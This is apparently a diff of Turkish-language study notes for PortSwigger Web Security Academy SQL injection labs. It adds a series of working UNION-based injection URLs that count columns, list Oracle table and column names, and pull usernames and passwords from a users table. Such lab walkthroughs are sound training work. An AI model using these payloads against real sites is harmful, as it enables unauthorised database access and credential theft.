@@ -56,3 +56,24 @@ tüm kullanıcıların şifrelerini bul => Pets' UNION SELECT username_nlemgu, p
 ###################################################################################
 
 6--> 
+https://$YOURLABSID.web-security-academy.net/filter?category=Gifts
+Sütun sayısı ve metinleri bul => https://$YOURLABSID.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+%27abc%27,%27def%27+FROM+dual--
+Tablo isimlerini ele geçir => https://$YOURLABSID.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+table_name,NULL+FROM+all_tables--
+Tablodaki sütünların ayrıntılarını bul => https://$YOURLABSID.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name=%27USERS_RUALXQ%27--
+tüm kullanıcıların şifrelerini bul => https://$YOURLABSID.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+USERNAME_JRIBRV,+PASSWORD_AHLCIP+FROM+USERS_RUALXQ--
+
+#################################################################################################
+#      SQL injection UNION attack, determining the number of columns returned by the query      #
+#      Sorgunun döndürdüğü sütun sayısını belirleyen SQL enjeksiyon UNION saldırısı             #
+#################################################################################################
+
+7--> sütun sayısını bulmamızı istiyor
+https://$YOURLABSID.web-security-academy.net/filter?category=Lifestyle'+UNION+SELECT+NULL--
+https://$YOURLABSID.web-security-academy.net/filter?category=Lifestyle%27+UNION+SELECT+NULL,NULL,NULL--
+
+##########################################################################
+#      SQL injection UNION attack, finding a column containing text      #
+#      SQL enjeksiyon UNION saldırısı, metin içeren bir sütun bulma      #
+##########################################################################
+
+8--> 
